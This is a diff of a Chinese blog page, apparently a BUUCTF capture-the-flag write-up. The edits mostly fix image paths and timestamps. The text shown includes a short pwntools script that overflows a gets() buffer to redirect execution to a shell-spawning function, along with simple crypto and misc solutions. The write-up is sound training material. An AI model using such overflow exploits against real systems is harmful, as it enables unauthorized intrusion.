@@ -59,14 +59,14 @@
 <meta property="og:site_name" content="shallow&#39;s blog">
 <meta property="og:description" content="BUUCTFWP(持续更新)整点活，pwn+reverse+crypto菜鸡，随缘更新，做到哪写到哪pwnpwn有个system函数偶尔会出问题，详见这篇文章。 http:&#x2F;&#x2F;blog.eonew.cn&#x2F;archives&#x2F;958 顺便，因为有了python3-pwntools，所以下面脚本都是pwntools3的。">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="d:&#x2F;document&#x2F;XDU&#x2F;blog&#x2F;GIT&#x2F;true_blog&#x2F;source&#x2F;images&#x2F;新建文件夹&#x2F;QQ截图20200103163106.png">
-<meta property="og:image" content="d:&#x2F;document&#x2F;XDU&#x2F;blog&#x2F;GIT&#x2F;true_blog&#x2F;source&#x2F;images&#x2F;新建文件夹&#x2F;QQ截图20200103163437.png">
-<meta property="og:image" content="d:&#x2F;document&#x2F;XDU&#x2F;blog&#x2F;GIT&#x2F;true_blog&#x2F;source&#x2F;images&#x2F;新建文件夹&#x2F;QQ截图20200103163328.png">
-<meta property="og:image" content="c:&#x2F;Users&#x2F;shallow&#x2F;AppData&#x2F;Roaming&#x2F;Typora&#x2F;typora-user-images&#x2F;1578055858889.png">
-<meta property="og:image" content="d:&#x2F;document&#x2F;XDU&#x2F;blog&#x2F;GIT&#x2F;true_blog&#x2F;source&#x2F;images&#x2F;新建文件夹&#x2F;QQ截图20200103230137.png">
-<meta property="og:updated_time" content="2020-01-03T15:42:11.981Z">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;QQ截图20200103163106.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;QQ截图20200103163437.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;QQ截图20200103163328.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;QQ截图20200103205054.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;QQ截图20200103230137.png">
+<meta property="og:updated_time" content="2020-01-03T15:59:56.754Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="d:&#x2F;document&#x2F;XDU&#x2F;blog&#x2F;GIT&#x2F;true_blog&#x2F;source&#x2F;images&#x2F;新建文件夹&#x2F;QQ截图20200103163106.png">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;QQ截图20200103163106.png">
 
 <link rel="canonical" href="http://yoursite.com/2020/01/03/BUUCTFWP/">
 
@@ -215,7 +215,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2020-01-03 23:41:00 / 修改时间：23:42:11" itemprop="dateCreated datePublished" datetime="2020-01-03T23:41:00+08:00">2020-01-03</time>
+              <time title="创建时间：2020-01-03 23:41:00 / 修改时间：23:59:56" itemprop="dateCreated datePublished" datetime="2020-01-03T23:41:00+08:00">2020-01-03</time>
             </span>
 
           
@@ -235,8 +235,8 @@
 
 <h3 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test_your_nc"></a>test_your_nc</h3><p>nc一下就完事了</p>
 <h3 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h3><p>checksec，发现没有开任何保护，扔进ida64，</p>
-<p><img src="D:\document\XDU\blog\GIT\true_blog\source\images\新建文件夹\QQ截图20200103163106.png" alt="QQ截图20200103163106"></p>
-<p><img src="D:\document\XDU\blog\GIT\true_blog\source\images\新建文件夹\QQ截图20200103163437.png" alt="QQ截图20200103163437"><img src="D:\document\XDU\blog\GIT\true_blog\source\images\新建文件夹\QQ截图20200103163328.png" alt="QQ截图20200103163328"></p>
+<p><img src="\images\QQ截图20200103163106.png" alt="QQ截图20200103163106"></p>
+<p><img src="\images\QQ截图20200103163437.png" alt="QQ截图20200103163437"><img src="\images\QQ截图20200103163328.png" alt="QQ截图20200103163328"></p>
 <p>可以看到在main函数里有gets危险函数，并且没有开栈保护，因此可以直接将其返回到fun函数中。然后gets函数得到的字符串从rbp+s = rbp-0x0F开始，因此填充0x0F+0x8个字节的A后放入fun的地址即可得到shell</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#apwn = remote('node3.buuoj.cn' , '29987')</span></span><br><span class="line">apwn = process(<span class="string">'./pwn1'</span>)</span><br><span class="line">payload = <span class="string">'A'</span>.encode() * <span class="number">0xf</span> + p64(<span class="number">0xdeadbeef</span>) + p64(<span class="number">0x401186</span>)</span><br><span class="line">apwn.sendline(payload)</span><br><span class="line">apwn.interactive()</span><br></pre></td></tr></table></figure>
 <h3 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h3><p>与rip几乎一模一样的题目，只在此记录一下脚本。。</p>
@@ -263,7 +263,8 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cipher = <span class="string">'afZ_r9VYfScOeO_UL^RWUc'</span></span><br><span class="line">plain = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher)):</span><br><span class="line">    plain += chr(ord(cipher[i]) + i + <span class="number">5</span>)</span><br><span class="line">print(plain)</span><br></pre></td></tr></table></figure>
 <h3 id="Quoted-printable"><a href="#Quoted-printable" class="headerlink" title="Quoted-printable"></a>Quoted-printable</h3><p>百度可知，这种编码与上面说的url编码几乎一样，因此只需要将上面的脚本的%改成=即可</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">fr = open(<span class="string">'question.txt'</span> , <span class="string">'r'</span>)</span><br><span class="line">s = fr.read()</span><br><span class="line">list1 = s.split(<span class="string">'='</span>)                    <span class="comment">#同样很懒的工具人行为：把文件第一个=去掉了</span></span><br><span class="line">plain = <span class="string">''</span>.encode(<span class="string">'latin'</span>)</span><br><span class="line">temp = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list1:</span><br><span class="line">    temp = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'A'</span> &lt;= j &lt;= <span class="string">'Z'</span>:</span><br><span class="line">            temp = temp * <span class="number">16</span> + ord(j) - ord(<span class="string">'A'</span>) + <span class="number">10</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            temp = temp * <span class="number">16</span> + ord(j) - ord(<span class="string">'0'</span>)</span><br><span class="line">    plain += chr(temp).encode(<span class="string">'latin'</span>)</span><br><span class="line">print(plain.decode())</span><br></pre></td></tr></table></figure>
-<p>答案跑出来是：那你也很棒哦。所以这就导致一个问题，若是不加上<code>encode(&#39;latin&#39;)</code>则输出会变成é£ä½ ä¹¾æ£å¦，原因很显然是中文的问题，因为中文的utf-8编码并不是一个字节对应一个字，而这里把它当成ascii码一个字节对应一个字符输出了，必然会出错。若只加上<code>encode()</code>呢，在前面用bytes类型，在输出的时候<code>decode()</code>即可。不过这里又有一个问题，图中可以看出，第一个值为E9，temp = 233 = 14 * 16 + 9没有问题，但是plain却是c3a9，多出了一个字节，并且值完全不同，这就是由于chr(x)是返回unicode中x对应的字符，它在0-127都与ascii码表相同，同样，utf-8同样编码表中0-127对应的字符也与ascii码表相同，但是当超过128时，utf-8就会用两个字节来表示一个字符，且与之前不相同，因此，需要用latin（与unicode表相同且用一个字节表示一个字符）来encode，decode的时候用utf-8就能够正常显示中文了。<img src="C:\Users\shallow\AppData\Roaming\Typora\typora-user-images\1578055858889.png" alt="1578055858889"></p>
+<p>答案跑出来是：那你也很棒哦。所以这就导致一个问题，若是不加上<code>encode(&#39;latin&#39;)</code>则输出会变成é£ä½ ä¹¾æ£å¦，原因很显然是中文的问题，因为中文的utf-8编码并不是一个字节对应一个字，而这里把它当成ascii码一个字节对应一个字符输出了，必然会出错。若只加上<code>encode()</code>呢，在前面用bytes类型，在输出的时候<code>decode()</code>即可。不过这里又有一个问题，图中可以看出，第一个值为E9，temp = 233 = 14 * 16 + 9没有问题，但是plain却是c3a9，多出了一个字节，并且值完全不同，这就是由于chr(x)是返回unicode中x对应的字符，它在0-127都与ascii码表相同，同样，utf-8同样编码表中0-127对应的字符也与ascii码表相同，但是当超过128时，utf-8就会用两个字节来表示一个字符，且与之前不相同，因此，需要用latin（与unicode表相同且用一个字节表示一个字符）来encode，decode的时候用utf-8就能够正常显示中文了。</p>
+<p><img src="\images\QQ截图20200103205054.png" alt="QQ截图20200103205054"></p>
 <h3 id="password"><a href="#password" class="headerlink" title="password"></a>password</h3><p>这道题是嘲讽某些人拿生日当密码吗</p>
 <p>好像就是脑洞题？flag{zs19900315}</p>
 <h3 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h3><p>老题目了，winhex打开将第二个504B后7位的09改成00即可</p>
@@ -274,7 +275,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">fai_n = mpz(<span class="number">473398607160</span> * <span class="number">4511490</span>)</span><br><span class="line">d = invert(<span class="number">17</span> , fai_n)</span><br><span class="line">print(d)</span><br></pre></td></tr></table></figure>
 <h3 id="丢失的md5"><a href="#丢失的md5" class="headerlink" title="丢失的md5"></a>丢失的md5</h3><p>好像直接跑一遍脚本就出来了</p>
 <h3 id="篱笆墙的影子"><a href="#篱笆墙的影子" class="headerlink" title="篱笆墙的影子"></a>篱笆墙的影子</h3><p>既然是篱笆，仿佛跟栅栏长得很像，那就是栅栏了</p>
-<p><img src="D:\document\XDU\blog\GIT\true_blog\source\images\新建文件夹\QQ截图20200103230137.png" alt="QQ截图20200103230137"></p>
+<p><img src="\images\QQ截图20200103230137.png" alt="QQ截图20200103230137"></p>
 <h3 id="Alice与Bob"><a href="#Alice与Bob" class="headerlink" title="Alice与Bob"></a>Alice与Bob</h3><p>甚至不需要写脚本，在线分解大数网站跑一跑，md5一下就解决了</p>
 <p>那个大数分解网站：<a href="http://factordb.com/" target="_blank" rel="noopener">http://factordb.com/</a></p>
 
